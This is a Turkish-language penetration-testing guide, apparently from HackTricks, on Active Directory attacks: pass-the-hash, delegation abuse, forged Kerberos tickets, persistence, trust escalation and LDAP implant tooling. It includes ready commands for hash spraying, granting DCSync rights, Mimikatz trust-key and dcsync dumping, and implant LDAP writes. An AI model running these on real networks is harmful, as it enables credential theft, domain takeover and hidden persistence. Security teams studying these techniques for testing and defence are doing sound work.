Umarız [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), relaying dahil [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [privilege'ları local olarak escalate ederek](../windows-local-privilege-escalation/index.html) bazı **local admin** account'larını **compromise etmişsinizdir**.\
Ardından memory'deki ve local olarak bulunan tüm hash'leri dump etme zamanı.\
[**Hash'leri elde etmenin farklı yolları hakkında bilgi için bu sayfayı okuyun.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Bir user'ın hash'ine sahip olduğunuzda**, onu **impersonate etmek** için kullanabilirsiniz.\
Bu **hash'i kullanarak** **NTLM authentication'ı gerçekleştirecek** bir **tool** kullanmanız gerekir; **veya** yeni bir **sessionlogon** oluşturup bu **hash'i** **LSASS içine inject edebilirsiniz**. Böylece herhangi bir **NTLM authentication gerçekleştirildiğinde**, **bu hash kullanılır.** Son seçenek mimikatz'ın yaptığı şeydir.\
[**Daha fazla bilgi için bu sayfayı okuyun.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Bu saldırı, yaygın Pass The Hash over NTLM protocol'üne alternatif olarak **user'ın NTLM hash'ini Kerberos ticket'ları istemek için kullanmayı** amaçlar. Bu nedenle, **NTLM protocol'ünün devre dışı bırakıldığı ve authentication protocol'ü olarak yalnızca Kerberos'a izin verilen** network'lerde özellikle **kullanışlı** olabilir.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT) attack** yönteminde saldırganlar, password veya hash değerleri yerine **bir user'ın authentication ticket'ını çalar**. Bu çalınan ticket daha sonra **user'ı impersonate etmek** ve bir network içindeki resource'lara ve service'lere yetkisiz erişim kazanmak için kullanılır.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Bir **local administrator**'ın **hash'ine** veya **password'üne** sahipseniz, bununla diğer **PC'lere local olarak login olmayı** denemelisiniz.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Bunun oldukça **gürültülü** olduğunu ve **LAPS**'ın bunu **mitigate edebileceğini** unutmayın.

### MSSQL Abuse & Trusted Links

Bir kullanıcının **MSSQL instance'larına erişme** ayrıcalıkları varsa, bunları MSSQL host'unda **komut çalıştırmak** (SA olarak çalışıyorsa), NetNTLM **hash'ini çalmak** veya bir **relay** **saldırısı** gerçekleştirmek için kullanabilir.\
Ayrıca, bir MSSQL instance'ı farklı bir MSSQL instance'ı tarafından güvenilir durumdaysa (database link), kullanıcının güvenilen database üzerinde ayrıcalıkları varsa, **trust relationship'i kullanarak diğer instance üzerinde de sorgular çalıştırabilir**. Bu trust'ler zincirlenebilir ve bir noktada kullanıcı, komut çalıştırabileceği yanlış yapılandırılmış bir database bulabilir.\
**Database'ler arasındaki link'ler forest trust'leri arasında bile çalışır.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory ve deployment paketleri, kimlik bilgilerine ve code execution'a giden güçlü yolları sıklıkla açığa çıkarır. Bkz.:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) özniteliğine sahip herhangi bir Computer object bulur ve computer üzerinde domain ayrıcalıklarına sahip olursanız, computer'a login olan tüm kullanıcıların TGT'lerini memory'den dump edebilirsiniz.\
Dolayısıyla bir **Domain Admin computer'a login olursa**, onun TGT'sini dump edebilir ve [Pass the Ticket](pass-the-ticket.md) kullanarak onu taklit edebilirsiniz.\
Constrained delegation sayesinde bir **Print Server'ı otomatik olarak compromise** etmek bile mümkün olabilir (umarız bu bir DC'dir).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Bir kullanıcı veya computer "Constrained Delegation" için yetkilendirilmişse, bir computer üzerindeki bazı service'lere erişmek için **herhangi bir kullanıcıyı taklit edebilir**.\
Daha sonra bu kullanıcı/computer'ın **hash'ini compromise** ederseniz, bazı service'lere erişmek için **herhangi bir kullanıcıyı** (domain admin'ler dahil) **taklit edebilirsiniz**.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Uzak bir computer'ın Active Directory object'i üzerinde **WRITE** ayrıcalığına sahip olmak, **yükseltilmiş ayrıcalıklarla** code execution elde edilmesini sağlar:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromise edilmiş kullanıcı, bazı domain object'leri üzerinde daha sonra lateral **hareket** etmesine/**ayrıcalıklarını yükseltmesine** olanak sağlayabilecek **ilginç ayrıcalıklara** sahip olabilir.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain içinde **Spool service'in listening durumda olduğunu** keşfetmek, yeni kimlik bilgileri **elde etmek** ve **ayrıcalıkları yükseltmek** için **abuse** edilebilir.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**Diğer kullanıcılar** **compromise edilmiş** makineye **erişirse**, memory'den kimlik bilgilerini **toplamak** ve hatta onları taklit etmek için process'lerine **beacon inject etmek** mümkündür.\
Kullanıcılar genellikle sisteme RDP üzerinden erişir; bu nedenle burada third-party RDP session'ları üzerinde birkaç saldırının nasıl gerçekleştirileceğini bulabilirsiniz:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**, domain'e katılmış computer'larda **local Administrator password'ünü** yönetmek için bir sistem sağlar ve bu password'ün **randomized**, benzersiz ve sık sık **changed** olmasını garanti eder. Bu password'ler Active Directory'de saklanır ve erişim yalnızca yetkili kullanıcılar için ACL'ler aracılığıyla kontrol edilir. Bu password'lere erişmek için yeterli izinlere sahip olduğunuzda, diğer computer'lara pivot etmek mümkün hale gelir.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Certificate'ları toplamak**, environment içinde ayrıcalıkları yükseltmenin bir yolu olabilir:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**Vulnerable template'ler** yapılandırılmışsa, ayrıcalıkları yükseltmek için bunları abuse etmek mümkündür:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## High privilege account ile Post-exploitation

### Dumping Domain Credentials

**Domain Admin** veya daha iyisi **Enterprise Admin** ayrıcalıklarını elde ettiğinizde, **domain database'ini**: _ntds.dit_ **dump** edebilirsiniz.

[**DCSync attack hakkında daha fazla bilgiye buradan ulaşabilirsiniz**](dcsync.md).

[**NTDS.dit'i nasıl çalacağınız hakkında daha fazla bilgiye buradan ulaşabilirsiniz**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Daha önce ele alınan bazı technique'ler persistence için kullanılabilir.\
Örneğin şunları yapabilirsiniz:

- Kullanıcıları [**Kerberoast**](kerberoast.md) için vulnerable hale getirmek

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Kullanıcıları [**ASREPRoast**](asreproast.md) için vulnerable hale getirmek

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Bir kullanıcıya [**DCSync**](#dcsync) ayrıcalıkları vermek

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack**, **NTLM hash'ini** (örneğin **PC account'ın hash'ini**) kullanarak belirli bir service için **legitimate Ticket Granting Service (TGS) ticket** oluşturur. Bu yöntem, **service ayrıcalıklarına erişmek** için kullanılır.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Bir **Golden Ticket attack**, saldırganın Active Directory (AD) environment'ında **krbtgt account'ın NTLM hash'ine** erişim elde etmesini içerir. Bu account özeldir; çünkü AD network'ü içinde authentication için gerekli olan tüm **Ticket Granting Ticket'ları (TGT'ler)** imzalamak için kullanılır.

Saldırgan bu hash'i elde ettiğinde, seçtiği herhangi bir account için **TGT'ler** oluşturabilir (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Bunlar, **yaygın golden ticket detection mechanism'lerini bypass edecek** şekilde forge edilmiş golden ticket'lar gibidir.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

Bir account'ın **certificate'larına sahip olmak veya bunları request edebilmek**, kullanıcı password'ünü değiştirse bile account'ta persistence sağlayabilmenin çok iyi bir yoludur:


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificate'ları kullanarak domain içinde yüksek ayrıcalıklarla persistence sağlamak da mümkündür:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory'deki **AdminSDHolder** object'i, yetkisiz değişiklikleri önlemek amacıyla **privileged group'lar** (Domain Admins ve Enterprise Admins gibi) genelinde standart bir **Access Control List (ACL)** uygulayarak bu grupların güvenliğini sağlar. Ancak bu özellik abuse edilebilir; bir saldırgan AdminSDHolder'ın ACL'sini değiştirerek normal bir kullanıcıya tam erişim verirse, bu kullanıcı tüm privileged group'lar üzerinde geniş kapsamlı kontrol elde eder. Koruma amacı taşıyan bu security measure, yakından izlenmediği takdirde geri tepebilir ve yetkisiz erişime izin verebilir.

[**AdminDSHolder Group hakkında daha fazla bilgi burada.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Her **Domain Controller (DC)** içinde bir **local administrator** account'ı bulunur. Böyle bir machine üzerinde admin hakları elde edilerek local Administrator hash'i **mimikatz** kullanılarak extract edilebilir. Bunun ardından, **bu password'ün kullanımını enable etmek** ve local Administrator account'ına remote access sağlamak için bir registry modification gereklidir.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Belirli domain object'leri üzerinde bir **kullanıcıya**, kullanıcının gelecekte **ayrıcalıklarını yükseltmesini** sağlayacak bazı **özel izinler verebilirsiniz**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptor'lar**, bir **object'in** başka bir **object** üzerindeki sahip olduğu **izinleri** depolamak için kullanılır. Bir object'in **security descriptor'ında** küçük bir değişiklik **yapabilirseniz**, privileged bir group'un üyesi olmanız gerekmeksizin o object üzerinde oldukça ilginç ayrıcalıklar elde edebilirsiniz.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Kısa ömürlü principal'lar/GPO'lar/DNS record'ları oluşturmak için `dynamicObject` auxiliary class'ını `entryTTL`/`msDS-Entry-Time-To-Die` ile abuse edin; bunlar tombstone bırakmadan kendilerini siler, LDAP evidence'ını silerken orphan SID'ler, bozuk `gPLink` referansları veya cache'lenmiş DNS response'ları (ör. AdminSDHolder ACE pollution ya da malicious `gPCFileSysPath`/AD-integrated DNS redirect'leri) bırakır.

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Tüm domain account'larına erişim sağlayan **universal password** oluşturmak için memory'deki **LSASS**'ı değiştirin.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP'nin (Security Support Provider) ne olduğunu buradan öğrenin.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Machine'a erişmek için kullanılan **credential'ları** **clear text** olarak **capture etmek** üzere kendi **SSP'nizi** oluşturabilirsiniz.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD içinde **yeni bir Domain Controller** kaydeder ve bunu kullanarak belirli object'lere **attribute'lar** (SIDHistory, SPN'ler...) push eder; **modifications** hakkında herhangi bir **log** bırakmaz. **DA** ayrıcalıklarına sahip olmanız ve **root domain** içinde bulunmanız gerekir.\
Yanlış data kullanırsanız oldukça kötü log'ların ortaya çıkacağını unutmayın.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Daha önce **LAPS password'lerini okumak için yeterli izne** sahip olduğunuzda ayrıcalıkların nasıl yükseltileceğini ele almıştık. Ancak bu password'ler **persistence sağlamak** için de kullanılabilir.\
Bkz.:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft, **Forest**'ı security boundary olarak görür. Bu, **tek bir domain'in compromise edilmesinin tüm Forest'ın compromise edilmesine yol açabileceği** anlamına gelir.<sup>[[1]](#references)</sup>

### Basic Information

Bir [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>), bir **domain** kullanıcısının başka bir **domain** içindeki resource'lara erişmesini sağlayan bir security mechanism'dir. Esasen iki domain'in authentication system'leri arasında bir bağlantı oluşturur ve authentication verification'larının sorunsuz şekilde akmasını sağlar. Domain'ler bir trust kurduğunda, trust'ın bütünlüğü için kritik olan belirli **key'leri** kendi **Domain Controller'ları (DC'ler)** içinde exchange eder ve saklar.

Tipik bir senaryoda, bir kullanıcı **trusted domain** içindeki bir service'e erişmek istiyorsa, önce kendi domain'inin DC'sinden **inter-realm TGT** olarak bilinen özel bir ticket request etmelidir. Bu TGT, her iki domain'in üzerinde anlaşmış olduğu ortak bir **key** ile encrypt edilir. Kullanıcı daha sonra service ticket (**TGS**) almak için bu TGT'yi **trusted domain'in DC'sine** sunar. Trusted domain'in DC'si inter-realm TGT'yi başarıyla validate ettikten sonra bir TGS verir ve kullanıcıya service'e erişim sağlar.

**Adımlar**:

1. **Domain 1** içindeki bir **client computer**, **NTLM hash'ini** kullanarak **Domain Controller'ından (DC1)** bir **Ticket Granting Ticket (TGT)** request ederek süreci başlatır.
2. Client başarıyla authenticate edilirse DC1 yeni bir TGT verir.
3. Client daha sonra **Domain 2** içindeki resource'lara erişmek için gereken **inter-realm TGT'yi** DC1'den request eder.
4. Inter-realm TGT, iki yönlü domain trust'ın bir parçası olarak DC1 ve DC2 arasında paylaşılan bir **trust key** ile encrypt edilir.
5. Client, inter-realm TGT'yi **Domain 2'nin Domain Controller'ına (DC2)** götürür.
6. DC2, paylaşılan trust key'i kullanarak inter-realm TGT'yi verify eder ve geçerliyse client'ın erişmek istediği Domain 2 server'ı için bir **Ticket Granting Service (TGS)** verir.
7. Son olarak client, service'e erişmek için bu TGS'yi server'a sunar; TGS, server'ın account hash'i ile encrypt edilmiştir.

### Different trusts

Bir **trust'ın 1 yönlü veya 2 yönlü olabileceğine** dikkat etmek önemlidir. 2 yönlü seçeneklerde her iki domain de birbirine trust eder; ancak **1 yönlü** trust relation'da domain'lerden biri **trusted**, diğeri **trusting** domain olur. Son durumda, **trusted domain'den trusting domain içindeki resource'lara erişebilirsiniz**.

Domain A, Domain B'ye trust ediyorsa A trusting domain, B ise trusted domain'dir. Ayrıca **Domain A** açısından bu bir **Outbound trust**; **Domain B** açısından ise bir **Inbound trust** olur.

**Farklı trust relationship'leri**

- **Parent-Child Trusts**: Bu, aynı forest içinde yaygın bir yapılandırmadır; child domain, parent domain ile otomatik olarak iki yönlü transitive trust kurar. Bu, authentication request'lerinin parent ve child arasında sorunsuz biçimde akabilmesi anlamına gelir.
- **Cross-link Trusts**: "Shortcut trust'ler" olarak adlandırılan bu trust'lar, child domain'ler arasında referral süreçlerini hızlandırmak için kurulur. Karmaşık forest'larda authentication referral'ları genellikle forest root'a kadar çıkıp ardından hedef domain'e iner. Cross-link oluşturularak yol kısaltılır; bu, özellikle coğrafi olarak dağınık environment'larda faydalıdır.
- **External Trusts**: Farklı ve ilişkisiz domain'ler arasında kurulur ve doğaları gereği non-transitive'dir. [Microsoft documentation'a](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) göre external trust'ler, forest trust ile bağlı olmayan mevcut forest dışındaki bir domain'deki resource'lara erişmek için kullanışlıdır. External trust'lerde SID filtering ile security güçlendirilir.
- **Tree-root Trusts**: Forest root domain ile yeni eklenen bir tree root arasında otomatik olarak kurulur. Yaygın olarak karşılaşılmasa da tree-root trust'ler, forest'a yeni domain tree'leri eklemek, bunların benzersiz bir domain name korumasını sağlamak ve iki yönlü transitivity'yi mümkün kılmak için önemlidir. Daha fazla bilgi [Microsoft guide'ında](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) bulunabilir.
- **Forest Trusts**: Bu trust türü, iki forest root domain arasında iki yönlü transitive trust'tır ve security measures'ı güçlendirmek için SID filtering uygular.
- **MIT Trusts**: Windows dışı, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domain'leriyle kurulur. MIT trust'ler daha özelleştirilmiştir ve Windows ecosystem'i dışındaki Kerberos tabanlı system'lerle integration gerektiren environment'lara yöneliktir.

#### **Trusting relationship'lerdeki diğer farklar**

- Bir trust relationship **transitive** (A, B'ye trust eder; B, C'ye trust eder; dolayısıyla A, C'ye trust eder) veya **non-transitive** olabilir.
- Bir trust relationship **bidirectional trust** (her ikisi de birbirine trust eder) veya **one-way trust** (yalnızca biri diğerine trust eder) olarak kurulabilir.

### Attack Path

1. Trusting relationship'leri **enumerate edin**
2. Herhangi bir **security principal**'ın (user/group/computer) **diğer domain'in** resource'larına **erişimi** olup olmadığını kontrol edin; bu erişim ACE entry'leri aracılığıyla veya diğer domain'in group'larının üyesi olarak sağlanmış olabilir. **Domain'ler arasındaki relationship'leri** arayın (trust muhtemelen bunun için oluşturulmuştur).
1. Bu durumda kerberoast başka bir seçenek olabilir.
3. Domain'ler arasında **pivot** yapabilen **account'ları compromise edin**.

Saldırganların başka bir domain'deki resource'lara erişebilmesini sağlayan üç temel mechanism vardır:

- **Local Group Membership**: Principal'lar server üzerindeki “Administrators” group'u gibi machine'lerdeki local group'lara eklenebilir ve bu sayede machine üzerinde önemli kontrol elde edebilir.
- **Foreign Domain Group Membership**: Principal'lar foreign domain içindeki group'ların da üyesi olabilir. Ancak bu yöntemin etkinliği trust'ın niteliğine ve group'un scope'una bağlıdır.
- **Access Control Lists (ACLs)**: Principal'lar bir **ACL** içinde, özellikle bir **DACL** içindeki **ACE**'lerde entity olarak belirtilebilir ve belirli resource'lara erişim elde edebilir. ACL, DACL ve ACE'lerin çalışma mantığını daha ayrıntılı incelemek isteyenler için “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” başlıklı whitepaper değerli bir kaynaktır.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Domain içindeki foreign security principal'ları bulmak için **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** konumunu kontrol edebilirsiniz. Bunlar **harici bir domain/forest'tan** user/group'lar olacaktır.

Bunu **Bloodhound** ile veya powerview kullanarak kontrol edebilirsiniz:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Domain trust'larını enumerate etmenin diğer yolları:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> **2 güvenilir anahtar** vardır; biri _Child --> Parent_, diğeri ise _Parent_ --> _Child_ içindir.\
> Mevcut domain tarafından kullanılan anahtarı şu komutlarla alabilirsiniz:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Trust ilişkisinden SID-History injection ile yararlanarak child/parent domain üzerinde Enterprise admin yetkisine yükselin:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Yazılabilir Configuration NC'yi Exploit Etme

Configuration Naming Context'in (NC) nasıl exploit edilebileceğini anlamak kritik öneme sahiptir. Configuration NC, Active Directory (AD) ortamlarında bir forest genelindeki yapılandırma verileri için merkezi bir repository görevi görür. Bu veriler forest içindeki her Domain Controller'a (DC) replicate edilir ve yazılabilir DC'ler Configuration NC'nin yazılabilir bir kopyasını tutar. Bundan yararlanmak için bir DC üzerinde, tercihen bir child DC'de **SYSTEM yetkilerine** sahip olmak gerekir.

**GPO'yu root DC site'ına bağlama**

Configuration NC'nin Sites container'ı, AD forest'ına dahil tüm bilgisayarların site'ları hakkındaki bilgileri içerir. Herhangi bir DC üzerinde SYSTEM yetkileriyle çalışırken saldırganlar GPO'ları root DC site'larına bağlayabilir. Bu işlem, bu site'lara uygulanan policy'leri değiştirerek root domain'in ele geçirilmesine yol açabilir.

Ayrıntılı bilgi için [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) araştırması incelenebilir.<sup>[[12]](#references)</sup>

**Forest içindeki herhangi bir gMSA'yı ele geçirme**

Bir attack vector, domain içindeki ayrıcalıklı gMSA'ları hedeflemeyi içerir. gMSA'ların password'lerini hesaplamak için gerekli olan KDS Root key, Configuration NC içinde saklanır. Herhangi bir DC üzerinde SYSTEM yetkileriyle KDS Root key'e erişmek ve forest genelindeki herhangi bir gMSA'nın password'ünü hesaplamak mümkündür.

Ayrıntılı analiz ve adım adım yönlendirme için:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Tamamlayıcı delegated MSA attack (BadSuccessor – migration attributes'tan yararlanma):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ek external research: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Bu yöntem sabır gerektirir; yeni ayrıcalıklı AD object'lerinin oluşturulmasını beklemek gerekir. SYSTEM yetkileriyle saldırgan, herhangi bir user'a tüm class'lar üzerinde tam control vermek için AD Schema'yı değiştirebilir. Bu durum, yeni oluşturulan AD object'lerine yetkisiz erişim ve control sağlanmasına yol açabilir.

Daha fazla bilgi [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6) sayfasında bulunabilir.<sup>[[14]](#references)</sup>

**DA'dan EA'ya ADCS ESC5 ile**

ADCS ESC5 vulnerability, forest içindeki herhangi bir user olarak authentication sağlayan bir certificate template oluşturmak için Public Key Infrastructure (PKI) object'leri üzerindeki control'ü hedefler. PKI object'leri Configuration NC içinde bulunduğundan, yazılabilir bir child DC'nin ele geçirilmesi ESC5 attack'lerinin gerçekleştirilmesini sağlar.

Daha fazla ayrıntı [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/) içeriğinde bulunabilir.<sup>[[15]](#references)</sup> ADCS bulunmayan senaryolarda saldırgan, [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) içeriğinde açıklandığı üzere gerekli component'leri kurabilir.<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) veya bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Bu senaryoda **domain'iniz**, size bu domain üzerinde **belirsiz izinler** veren harici bir domain tarafından **trusted** durumdadır. Hangi principals'ların harici domain üzerinde hangi erişimlere sahip olduğunu bulmanız ve ardından bunu exploit etmeye çalışmanız gerekecek:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Harici Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Bu senaryoda **sizin domain'iniz**, **farklı domain'lerden** bir principal'a bazı **privileges** **trust** etmektedir.

Ancak bir **domain**, trusting domain tarafından **trusted** edildiğinde, trusted domain **öngörülebilir bir ada** sahip ve **password olarak trusted password'ü** kullanan bir **user** oluşturur. Bu da, trusting domain'deki bir **user'a erişerek trusted domain'in içine girmeyi**, onu enumerate etmeyi ve daha fazla **privileges** elde etmeye çalışmayı mümkün kılar:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Trusted domain'i compromise etmenin başka bir yolu, domain trust'ın **zıt yönünde** oluşturulmuş bir [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) bulmaktır (bu çok yaygın değildir).

Trusted domain'i compromise etmenin başka bir yolu da, trusted domain'den bir **user'ın erişebildiği** bir makinede bekleyerek onun **RDP** üzerinden login olmasını beklemektir. Ardından attacker, RDP session process'ine code inject edebilir ve buradan **victim'ın origin domain'ine erişebilir**.\
Ayrıca, **victim hard drive'ını mount ettiyse**, attacker **RDP session** process'inden **hard drive'ın startup folder'ına backdoor'lar** yerleştirebilir. Bu technique **RDPInception** olarak adlandırılır.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Forest trust'leri üzerinden SID history attribute'undan yararlanan attack'lerin riski, tüm inter-forest trust'lerde default olarak etkin olan SID Filtering ile azaltılır. Bu yaklaşım, Microsoft'un tutumuna göre security boundary olarak domain yerine forest kabul edildiğinden, intra-forest trust'lerin güvenli olduğu varsayımına dayanır.
- Ancak bir sorun vardır: SID filtering, applications ve user access'i bozabilir ve bu nedenle zaman zaman devre dışı bırakılır.

### **Selective Authentication:**

- Inter-forest trust'ler için Selective Authentication kullanılması, iki forest'tan gelen user'ların otomatik olarak authenticated edilmemesini sağlar. Bunun yerine user'ların trusting domain veya forest içindeki domain'lere ve server'lara erişebilmesi için açık permissions gerekir.
- Bu önlemlerin writable Configuration Naming Context (NC)'in exploit edilmesine veya trust account'a yönelik attack'lere karşı koruma sağlamadığını belirtmek önemlidir.

[**ired.team'de domain trust'ler hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## On-Host Implant'lar Üzerinden LDAP-tabanlı AD Abuse

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection), bloodyAD-style LDAP primitive'lerini tamamen on-host implant'ın (ör. Adaptix C2) içinde çalışan x64 Beacon Object Files olarak yeniden uygular. Operator'ler pack'i `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` komutuyla compile eder, `ldap.axs` dosyasını load eder ve ardından beacon'dan `ldap <subcommand>` çağırır. Tüm traffic, LDAP (389) üzerinden mevcut logon security context'i ile signing/sealing kullanılarak veya auto certificate trust ile LDAPS (636) üzerinden ilerler; bu nedenle socks proxy'leri veya disk artifact'ları gerekmez.<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` ve `get-groupmembers`, short name'leri/OU path'lerini full DN'lere resolve eder ve karşılık gelen object'leri dump eder.
- `get-object`, `get-attribute` ve `get-domaininfo`, arbitrary attribute'ları (security descriptor'lar dahil) ve forest/domain metadata'sını `rootDSE` üzerinden çeker.
- `get-uac`, `get-spn`, `get-delegation` ve `get-rbcd`, roasting candidate'lerini, delegation setting'lerini ve mevcut [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptor'larını doğrudan LDAP üzerinden gösterir.
- `get-acl` ve `get-writable --detailed`, trustee'leri, rights'ları (GenericAll/WriteDACL/WriteOwner/attribute writes) ve inheritance'ı listelemek için DACL'i parse eder; böylece ACL privilege escalation için immediate target'lar sağlar.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`), OU haklarının bulunduğu her yerde operatörün yeni principals veya machine accounts hazırlamasına olanak tanır. `add-groupmember`, `set-password`, `add-attribute` ve `set-attribute`, write-property hakları bulunduğunda hedeflerin doğrudan ele geçirilmesini sağlar.
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` ve `add-dcsync` gibi ACL odaklı komutlar, herhangi bir AD object üzerindeki WriteDACL/WriteOwner haklarını PowerShell/ADSI artefact'ları bırakmadan password reset, group membership control veya DCSync replication privileges elde etmek için kullanır. `remove-*` karşılıkları eklenen ACE'leri temizler.

### Delegation, roasting, and Kerberos abuse

